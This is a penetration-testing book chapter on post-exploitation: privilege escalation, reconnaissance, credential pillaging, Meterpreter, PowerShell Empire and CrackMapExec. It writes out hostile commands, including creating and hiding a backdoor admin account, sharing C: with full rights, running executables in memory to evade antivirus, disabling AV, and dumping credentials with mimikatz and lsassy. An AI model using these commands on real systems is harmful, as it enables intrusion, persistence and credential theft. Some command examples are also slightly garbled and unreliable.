<html><head></head><body>
  <div id="_idContainer458" class="Basic-Text-Frame">
    <h1 class="chapterNumber">11</h1>
    <h1 id="_idParaDest-265" class="chapterTitle">Action on the Objective and Lateral Movement</h1>
    <p class="normal">If exploiting a system is the definition of what a penetration test is, it is the action on the objective after the exploitation that gives the test its real purpose. This step demonstrates the severity of the exploit and the impact that it could have on the organization. This chapter will focus on the immediate post-exploit activities, as well as the aspect of horizontal privilege escalation—the process of using an exploited system as a starting point to jump on to other systems on the network.</p>
    <p class="normal">By the end of this chapter, you will have learned about the following topics:</p>
    <ul>
      <li class="bulletList">Local privilege escalation</li>
      <li class="bulletList">Post-exploitation tools</li>
      <li class="bulletList">Lateral movement within the target networks</li>
      <li class="bulletList">Compromising domain trusts</li>
      <li class="bulletList">Pivoting and port forwarding</li>
    </ul>
    <h1 id="_idParaDest-266" class="heading-1">Activities on the compromised local system</h1>
    <p class="normal">It is<a id="_idIndexMarker1199"/> usually possible to get guest or user access to a<a id="_idIndexMarker1200"/> system. Frequently, the attacker’s ability to access important information will be limited by reduced privilege levels. Therefore, a common post-exploitation activity is to escalate access privileges from guest to user to administrator and, finally, to SYSTEM. This<a id="_idIndexMarker1201"/> upward progression of gaining access privileges is usually referred to as <strong class="keyWord">vertical privilege escalation</strong>.</p>
    <p class="normal">The user can implement<a id="_idIndexMarker1202"/> several methods to gain advanced access credentials, including the following:</p>
    <ul>
      <li class="bulletList">Employ a network sniffer and/or keylogger to capture transmitted user credentials (<code class="inlineCode">bettercap</code>, <code class="inlineCode">responder</code>, or <code class="inlineCode">dsniff</code> are designed designed to extract passwords from live transmissions or a PCAP file that has been saved from a Wireshark or <code class="inlineCode">tshark</code> session).</li>
      <li class="bulletList">Perform a search for locally stored passwords. Some users collect passwords in an email folder (frequently called <code class="inlineCode">passwords</code>). Since password reuse and simple password construction systems are common, the passwords that are found can be employed during the escalation process.</li>
      <li class="bulletList">NirSoft (<a href="http://www.nirsoft.net"><span class="url">www.nirsoft.net</span></a>) produces<a id="_idIndexMarker1203"/> several free tools that can be uploaded to the compromised system by using Meterpreter to extract passwords from the operating system and applications that cache passwords (mail, remote access software, FTP, and web browsers).</li>
      <li class="bulletList">Dump the <code class="inlineCode">SAM</code> and <code class="inlineCode">SYSKEY</code> files using Meterpreter.</li>
      <li class="bulletList">When <a id="_idIndexMarker1204"/>some applications load, they read <strong class="keyWord">dynamic link library</strong> (<strong class="keyWord">DLL</strong>) files in a <a id="_idIndexMarker1205"/>particular order. It is possible to create a fake DLL with the same name as a legitimate DLL, place it in a specific directory location, and have the application load and execute it, resulting in elevated privileges for the attacker.</li>
      <li class="bulletList">Apply an exploit that uses a buffer overflow or other means to escalate privileges.</li>
      <li class="bulletList">Execute the <code class="inlineCode">getsystem</code> script, which will automatically escalate administrator privileges to the SYSTEM level, from the Meterpreter prompt.</li>
    </ul>
    <h2 id="_idParaDest-267" class="heading-2">Conducting rapid reconnaissance of a compromised system</h2>
    <p class="normal">Once a system <a id="_idIndexMarker1206"/>has been compromised, the <a id="_idIndexMarker1207"/>attacker needs to gain critical information about that system, its network environment, users, and user accounts. Usually, they will enter a series of commands or a script that invokes these commands from the shell prompt.</p>
    <p class="normal">If the compromised<a id="_idIndexMarker1208"/> system is based on the Unix platform, typical local reconnaissance commands will <a id="_idIndexMarker1209"/>include the<a id="_idIndexMarker1210"/> following:</p>
    <table id="table001-7" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">/etc/resolv.conf</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Uses the <code class="inlineCode">copy</code> command to access and review the system’s current DNS settings. Because it is a global file with read privileges, it will not trigger alarms when accessed.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">/etc/passwd</code> and <code class="inlineCode">/etc/shadow</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">These are system files that contain username and password hashes. It can be copied by a person with root-level access, and the passwords can be broken using a tool such as John the Ripper.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">whoami</code> and <code class="inlineCode">who -a</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the users on a local system.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">ifconfig -a</code>, <code class="inlineCode">iptables -L -n</code>, and <code class="inlineCode">netstat -r</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Provides networking information. <code class="inlineCode">ifconfig -a</code> provides IP addressing details, <code class="inlineCode">iptables -L -n</code> lists all of the rules held in the local firewall (if present), and <code class="inlineCode">netstat -r</code> displays the routing information maintained by the kernel.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">uname -a</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Prints the kernel version.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">ps aux</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Prints the currently running services, the process ID, and additional information.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">dpkg -l yum list | grep installed</code> and <code class="inlineCode">dpkg -l rpm -qa --last | head</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the installed software packages.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 11.1: Linux commands for reconnaissance that can be utilized by the pentesters</p>
    <p class="normal">These<a id="_idIndexMarker1211"/> commands contain a <a id="_idIndexMarker1212"/>brief synopsis of the options that are available. Refer to the appropriate command’s help file for complete information on how it can be used.</p>
    <p class="normal">For a Windows<a id="_idIndexMarker1213"/> system, the<a id="_idIndexMarker1214"/> following commands will be<a id="_idIndexMarker1215"/> entered:</p>
    <table id="table002-3" class="table-container">
      <thead>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">whoami /all</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Lists the current user, SID, user privileges, and groups.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">ipconfig /all</code> and <code class="inlineCode">ipconfig /displaydns</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Displays information regarding the network interface, connectivity protocols, and local DNS cache.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">netstat -bnao</code> and <code class="inlineCode">netstat -r</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Lists the ports and connections with the corresponding processes (<code class="inlineCode">-b</code>) to no lookups (<code class="inlineCode">-n</code>), all connections (<code class="inlineCode">-a</code>), and parent process IDs (<code class="inlineCode">-o</code>). The <code class="inlineCode">-r</code> option displays the routing table. They require administrator rights to run.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net view</code> and <code class="inlineCode">net view /domain</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Queries NBNS/SMB to locate all of the hosts in the current workgroup or domain. All of the domains that are available to the host are given by <code class="inlineCode">/domain</code>.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net user /domain</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Lists all of the users in the defined domain.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net user %username% /domain</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Obtains information on the current user if they are part of the queried domain (if you are a local user, then <code class="inlineCode">/domain</code> is not required). It includes the login times, the last time that the password was changed, the logon scripts, and the group memberships.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net accounts</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Prints the password policy for the local system. To print the password policy for the domain, use <code class="inlineCode">net accounts /domain</code>.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net localgroup administrators</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Prints the members of the administrator’s local group. Use the <code class="inlineCode">/domain</code> switch to obtain the administrators for the current domain.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net group "Domain Controllers" /domain</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Prints out a list of domain controllers for the current domain.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net share</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Displays the currently shared folders, which may not provide sufficient access controls for the data shared within the folders, and the paths that they point to.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 11.2: Windows commands for reconnaissance that can be utilized by the pentesters</p>
    <h2 id="_idParaDest-268" class="heading-2">Finding and taking sensitive data – pillaging the target</h2>
    <p class="normal">The <a id="_idIndexMarker1216"/>term <strong class="keyWord">pillaging</strong> (sometimes known as <strong class="keyWord">pilfering</strong>) is a holdover from the days when hackers who had<a id="_idIndexMarker1217"/> successfully compromised a system saw themselves as pirates, racing to their target to steal or damage as much data as possible. These terms have survived as a reference to the much more careful practice of stealing or modifying proprietary or financial data when the objective of the exploit has been achieved.</p>
    <p class="normal">The attacker can then focus on the secondary target—system files that will provide information to support additional attacks. The choice of the secondary files will depend on the operating system of the target. For example, if the compromised system is Unix, then the attacker will also target the following:</p>
    <ul>
      <li class="bulletList">The system and configuration files (usually in the <code class="inlineCode">/etc</code> directory, but depending on the implementation, they may be in <code class="inlineCode">/usr/local/etc</code> or other locations)</li>
      <li class="bulletList">The password files (<code class="inlineCode">/etc/password</code> and <code class="inlineCode">/etc/shadow</code>)</li>
      <li class="bulletList">The configuration files and public/private keys in the <code class="inlineCode">.ssh</code> directory</li>
      <li class="bulletList">The public and private key rings that may be contained in the <code class="inlineCode">.gnupg</code> directory</li>
      <li class="bulletList">The email and data files</li>
    </ul>
    <p class="normal">In a Windows system, the attacker will target the following:</p>
    <ul>
      <li class="bulletList">The system memory, which can be used to extract passwords, encryption keys, and so on</li>
      <li class="bulletList">The system registry files</li>
      <li class="bulletList">The <strong class="keyWord">Security Accounts Manager</strong> (<strong class="keyWord">SAM</strong>) database, which <a id="_idIndexMarker1218"/>contains hashed versions of the password, or alternative versions of the SAM database, which may be found in <code class="inlineCode">%SYSTEMROOT%\repair\SAM</code> and <code class="inlineCode">c:\Windows\System32\config\</code></li>
      <li class="bulletList">Any other password or seed files that are used for encryption</li>
      <li class="bulletList">The email and data files</li>
    </ul>
    <div class="note">
      <p class="normal">Don’t forget to review any folders that contain temporary items, such as attachments. For example, <code class="inlineCode">UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</code> may contain files, images, and cookies that may be of interest.</p>
    </div>
    <p class="normal">As stated previously, the system memory contains a significant amount of information for any attacker. Therefore, it is usually a priority file that you need to obtain. The system memory can be downloaded as a single image file from several sources, as follows:</p>
    <ul>
      <li class="bulletList">By <a id="_idIndexMarker1219"/>uploading a tool <a id="_idIndexMarker1220"/>to the compromised system and then directly<a id="_idIndexMarker1221"/> copying the memory (these tools include <strong class="keyWord">Belkasoft RAM capturer</strong>, <strong class="keyWord">Mandiant Memoryze</strong>, and <strong class="keyWord">MoonSols Dumpit</strong>)</li>
      <li class="bulletList">By copying the Windows hibernation file, <code class="inlineCode">hiberfil.sys</code>, and then mounting it using forensic tools to decrypt and analyze the file offline</li>
      <li class="bulletList">By copying a virtual machine and converting the VMEM (virtual machine’s paging file) file to a memory file
      </li>
    </ul>
<div class="packt_tip">
          <p class="normal">If you upload a program that’s designed to capture memory onto a compromised system, it is possible that this particular application will be identified as malicious software by antivirus software. Most antivirus/EDR software applications recognize the hash signature and behavior of memory acquisition software, and act to protect the sensitive contents of the physical memory by raising an alarm if it is at risk of disclosure. The acquisition software will be quarantined, and the target will receive a warning, alerting them of the attack.</p>

      <p class="normal">To avoid this, use the Metasploit Framework to run the executable completely in the target’s memory using the following command:</p>
      <pre class="programlisting con"><code class="hljs-con">meterpreter&gt; execute -H -m -d calc.exe -f &lt;memory executable + parameters&gt;
</code></pre>
      <p class="normal">The previous command executes <code class="inlineCode">calc.exe</code> as a dummy executable, but uploads the memory acquisition executable to run in its process space instead.</p>
      <p class="normal">The executable doesn’t show up in process lists, such as Task Manager, and detection using data forensic techniques is much harder because it’s not written to disk. Furthermore, it will avoid the system’s antivirus software, which generally does not scan the memory space in search of malware.</p>
    </div>

    <p class="normal">Once the physical memory has been downloaded, it can be analyzed using the Volatility framework, which is a collection of Python scripts that are designed to forensically analyze memory. If the operating system is supported, Volatility will scan the memory file and extract the following:</p>
    <ul>
      <li class="bulletList">The image information and system data that is sufficient for <em class="italic">tying</em> the image to its source system.</li>
      <li class="bulletList">The running processes, loaded DLLs, threads, sockets, connections, and modules.</li>
      <li class="bulletList">The open network sockets and connections, and recently opened network connections.</li>
      <li class="bulletList">The memory address, including physical and virtual memory mapping.</li>
      <li class="bulletList">The LM/NTLM hashes and LSA secrets. <strong class="keyWord">LanMan</strong> (<strong class="keyWord">LM</strong>) password hashes are Microsoft’s original attempt at protecting <a id="_idIndexMarker1222"/>passwords. Over the years, it has become simple to break them and convert the hashes back into an actual password. <strong class="keyWord">NT LanMan</strong> (<strong class="keyWord">NTLM</strong>) hashes<a id="_idIndexMarker1223"/> are more recent and resilient to attack. However, they are usually stored with the NTLM versions for backward compatibility. A <strong class="keyWord">Local Security Authority</strong> (<strong class="keyWord">LSA</strong>) stores secrets that are local <a id="_idIndexMarker1224"/>passwords: remote access (wired or wireless), VPN, autologon passwords, and so on. Any passwords that are stored on the system are vulnerable, especially if the user reuses passwords.</li>
      <li class="bulletList">Specific regular expressions or strings stored in memory.</li>
    </ul>
    <h3 id="_idParaDest-269" class="heading-3">Creating additional accounts</h3>
    <p class="normal">The following commands are<a id="_idIndexMarker1225"/> highly invasive and are usually detected by the system owner during the incident response process. However, they are frequently planted by an attacker to draw attention away from more persistent access mechanisms:</p>
    <table id="table003-2" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net user attacker password /add</code></p>
            <p class="normal"><code class="inlineCode">net user testuser testpassword /ADD /DOMAIN</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Creates a new local account with a user called <code class="inlineCode">attacker</code> and a password set to <code class="inlineCode">password</code>.</p>
            <p class="normal">It also adds the same user to the domain if you are running the command on a domain controller.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net localgroup administrators attacker /add</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Adds a new user called <code class="inlineCode">attacker</code> to the local administrators group. In some cases, the command will be <code class="inlineCode">net localgroup administrators /add attacker</code>.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net user username /active:yes /domain</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Changes an inactive or disabled account to active. In a small organization, this will attract attention. Large enterprises with poor password management can have 30% of their passwords flagged as inactive, so it may be an effective way to gain an account.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">net share name$=C:\ /grant:attacker,FULL /unlimited</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Shares <code class="inlineCode">C:</code> (or another specified drive) as a Windows share, and grants the user (attacker) full rights to access or modify all of the content on that drive.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 11.3: Windows commands that can be utilized to create users on local and domain servers</p>
    <p class="normal">If you create a new user <a id="_idIndexMarker1226"/>account, it will be noticed when anyone logs on to the welcome screen of the compromised system. To make the account invisible, you need to modify the registry from the command line using the following <code class="inlineCode">REG</code> command:</p>
    <pre class="programlisting con"><code class="hljs-con">REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\WinLogon\SpecialAccounts\UserList" /V account_name /T REG_DWORD /D 0
</code></pre>
    <p class="normal">This will modify the designated registry key to hide the account of the user (<code class="inlineCode">/V</code>). Again, there may be special syntax requirements based on the specific version of the target’s operating system, so determine the Windows version first and then validate it in a controlled test environment before implementing it against the target.</p>
    <h2 id="_idParaDest-270" class="heading-2">Post-exploitation tools</h2>
    <p class="normal">Post-exploitation<a id="_idIndexMarker1227"/> is the art of using the existing level of access to escalate, exploit, and exfiltrate. In the following sections, we will explore three different post-exploitation tools: Metasploit’s Meterpreter, PowerShell Empire, and CrackMapExec.</p>
    <h3 id="_idParaDest-271" class="heading-3">The Metasploit Framework – Meterpreter</h3>
    <p class="normal">Metasploit <a id="_idIndexMarker1228"/>was developed to support both exploit and post-exploit activities. The present version contains approximately 2,180 exploits, 1,155 auxiliary, and 399 post-exploitation modules. There are around 229 Windows modules that simplify post-exploit activities. We will review some of the most important modules here.</p>
    <p class="normal">In the following <a id="_idIndexMarker1229"/>examples, we have successfully exploited a vulnerable Microsoft exchange server running on Windows 2016 (a classic attack that is frequently used to validate more complex aspects of Meterpreter). The initial step is to conduct an immediate reconnaissance of the network and the compromised system.</p>
    <p class="normal">The initial Meterpreter<a id="_idIndexMarker1230"/> shell is fragile and vulnerable to failure over an extended period of time. Therefore, once a system has been exploited, we need to migrate the shell and bind it with a more stable process. This also makes detecting the exploit more difficult. At the Meterpreter prompt, enter <code class="inlineCode">ps</code> to obtain a list of running processes, as shown in <em class="italic">Figure 11.1</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_01.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.1: Using Meterpreter to list all the running processes</p>
    <p class="normal">The <code class="inlineCode">ps</code> command also returns the full path name for each process. This was omitted from <em class="italic">Figure 11.1</em>. The <code class="inlineCode">ps</code> list identifies that <code class="inlineCode">c:\windows\explorer.exe</code> is running. In this particular case, it is identified with the process ID of <code class="inlineCode">1868</code>, as shown in <em class="italic">Figure 11.2</em>. As this is a generally stable application, we will migrate the shell to that process:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_02.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.2: Migrating to a different privileged process</p>
    <p class="normal">One of the first <a id="_idIndexMarker1231"/>parameters to identify is: are we on a virtual machine? With the <a id="_idIndexMarker1232"/>Meterpreter session open between the compromised system and the attacker, the <code class="inlineCode">run post exploit module checkvm</code> command is issued, as shown in <em class="italic">Figure 11.3</em>. The returned data indicates that <code class="inlineCode">This is a VirtualBox Virtual Machine</code>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_03.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.3: Using the post-exploit module to gather information about the virtual machine</p>
    <p class="normal">Some of the most important post-exploitation modules<a id="_idIndexMarker1233"/> that are available<a id="_idIndexMarker1234"/> through Meterpreter are described in <em class="italic">Table 11.4</em>:</p>
    <table id="table004-1" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">run post/windows/manage/inject_host</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Allows the attacker to add entries to the Windows <code class="inlineCode">HOSTS</code> file. This can divert traffic to a different site (a fake site), which will download additional tools or ensure that the antivirus software cannot connect to the internet or a local server to obtain signature updates.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">run post/windows/gather/cachedump</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Dumps all of the cached information that can be further utilized to exfiltrate data.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">run use post/windows/manage/killav</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Disables most of the antivirus services running on the compromised system. This script is frequently out of date, and success should be manually verified.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">run winenum</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Performs a command-line and WMIC characterization of the exploited system. It dumps the important keys from the registry and LM hashes.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">run scraper</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Gathers comprehensive information that has not been gathered by other scripts, such as the entire Windows registry.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">run upload</code> and <code class="inlineCode">run download</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Allows the attacker to upload and download files onto the target system.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 11.4: Meterpreter post-exploit modules </p>
    <p class="normal">Let’s look at an<a id="_idIndexMarker1235"/> example. Here, we will run <code class="inlineCode">winenum</code> on the compromised system, which dumps all the important registry keys and LM hashes for lateral <a id="_idIndexMarker1236"/>movement and privilege escalation. This can be accomplished by running <code class="inlineCode">run winenum</code> on the Meterpreter shell. You should see the confirmation <code class="inlineCode">All tokens have been processed</code>, as shown in <em class="italic">Figure 11.4</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_04.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.4: Running Meterpreter Windows enumeration</p>
    <p class="normal">All the individual findings will be stored in the <code class="inlineCode">/root/.msf4/logs/scripts/winenum</code> folder. Attackers will be able to view the contents with the details as seen in <em class="italic">Figure 11.5</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_05.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.5: Windows enumeration script output from Meterpreter script</p>
    <p class="normal">One of the other things attackers can do is impersonate the session tokens by using Meterpreter and<a id="_idIndexMarker1237"/> utilizing the incognito module. Initially, a standalone module was created to impersonate a user by using the session tokens. These are similar to web session cookies in that they can identify the user without having to ask for their username and password every time. Similarly, the same situation applies to the computer and network.</p>
    <p class="normal">Attackers can run incognito in <a id="_idIndexMarker1238"/>Meterpreter by running <code class="inlineCode">use incognito</code> in the Meterpreter shell, as shown in <em class="italic">Figure 11.6</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_06.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.6: Listing all the tokens available</p>
    <p class="normal">For example, if the <a id="_idIndexMarker1239"/>Meterpreter shell is pawned by a local user, by <a id="_idIndexMarker1240"/>impersonating the user token as system user <code class="inlineCode">NT Authority</code>, a normal user can enjoy the privilege of a system user.</p>
    <p class="normal">To run the impersonation, attackers can run <code class="inlineCode">impersonate_token</code> from the Meterpreter shell, as shown in <em class="italic">Figure 11.7</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_07.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.7: Utilizing the token impersonation using Meterpreter</p>
    <h3 id="_idParaDest-272" class="heading-3">The PowerShell Empire project </h3>
    <p class="normal">In the last chapter, we <a id="_idIndexMarker1241"/>have learned about the PowerShell Empire <a id="_idIndexMarker1242"/>framework and how to create a stager to launch the attack. Attackers can save the PowerShell output from the stager into a <code class="inlineCode">.ps1</code> file. In this section, we will go ahead and run the stager on our target. </p>
    <p class="normal">To get the systems to become their agents, attackers can utilize their existing Meterpreter session to run the PowerShell, along with the payload generated by the Empire tool, as shown in <em class="italic">Figure 11.8</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_08.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.8: Running PowerShell from the compromised machine</p>
    <p class="normal">Once the <a id="_idIndexMarker1243"/>payload is run on the remote system, our Empire tool<a id="_idIndexMarker1244"/> interface must show the following:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_09.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.9: Successful execution of the PowerShell script on the target reports to Empire</p>
    <p class="normal">To interact with an agent, you must type <code class="inlineCode">agents</code> to list all the agents that are connected to you, as well as <code class="inlineCode">interact "name of the agent"</code>. You can run the <code class="inlineCode">system level</code> command from our HTTP listener to the agent, as shown in <em class="italic">Figure 11.10</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_10.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.10: Running shell commands on the remote server using PowerShell Empire</p>
    <h3 id="_idParaDest-273" class="heading-3">CrackMapExec</h3>
    <p class="normal"><strong class="keyWord">CrackMapExec</strong> (<strong class="keyWord">CME</strong>) is another <a id="_idIndexMarker1245"/>post-exploitation tool that helps automate assessing <a id="_idIndexMarker1246"/>the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of <em class="italic">living off the land</em>: abusing built-in Active Directory features/protocols to achieve its functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.</p>
    <p class="normal">CME makes heavy use of the Impacket library and PowerSploit for working with network protocols and performing a variety of post-exploitation techniques. CME is installed by default in Kali Linux; you should be able to list all of the modules in the tool by running <code class="inlineCode">crackmapexec service -L</code>, as shown in <em class="italic">Figure 11.11</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_11.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.11: CrackMapExec SMB modules</p>
    <p class="normal">This <a id="_idIndexMarker1247"/>tool works for the objective that has been set during a red team or pentest. CME can be briefly divided into three parts: protocols, modules, and databases:</p>
    <p class="normal"><strong class="keyWord">Protocols</strong>: CME <a id="_idIndexMarker1248"/>supports SMB, MSSQL, LDAP, WINRM, and SSH. These are protocols that are commonly used in most organizations.</p>
    <p class="normal"><strong class="keyWord">Modules</strong>: <em class="italic">Table 11.5</em> provides a list of SMB modules that are important and handy while using CME. However, the modules aren’t limited to this list; testers can also utilize third-party plugins or write their <a id="_idIndexMarker1249"/>own PowerShell script and invoke them using CME:</p>
    <table id="table005-1" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Module Name</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">empire_exec</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">This will launch the Empire RESTful API and generate a launcher for the specific listener before executing on the target.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Shellcode_inject</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Utilizes PowerSploit’s <code class="inlineCode">Invoke-Shellcode.ps1</code> script to inject the shellcode into memory and downloads the specified raw shellcode.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">mimikittenz</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">If <code class="inlineCode">mimikatz</code> is being blocked, you can utilize <code class="inlineCode">mimikittenz</code>. This module will enable the testers to extract the credentials from memory without having to download another payload.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">com_exec</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Uses COM scriptlets to bypass application whitelisting.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Mimikatz_enum_chrome</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Utilizes PowerSploit’s <code class="inlineCode">Invoke-Mimikatz.ps1</code> script to decrypt saved passwords in Google Chrome.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">tokens</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Utilizes PowerSploit’s <code class="inlineCode">Invoke-TokenManipulation</code> script to extract tokens.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">mimikatz</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Utilizes PowerSploit’s <code class="inlineCode">Invoke-Mimikatz.ps1</code> script to dump the passwords into plaintext.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Pe_inject</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">This utilizes PowerSploit’s <code class="inlineCode">Invoke-ReflectivePEInjection.ps1</code> script to inject the script into memory by downloading the specified DLL/EXE.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">lsassy</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">A very interesting payload that allows you to dump the <code class="inlineCode">lsass.exe</code> and send the results remotely.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wireless</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Downloads all the wireless keys in plaintext specific to the interfaces configured on the target.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">rdp</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Allows the testers to enable/disable remote desktop protocol.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 11.5: CrackMapExec modules </p>
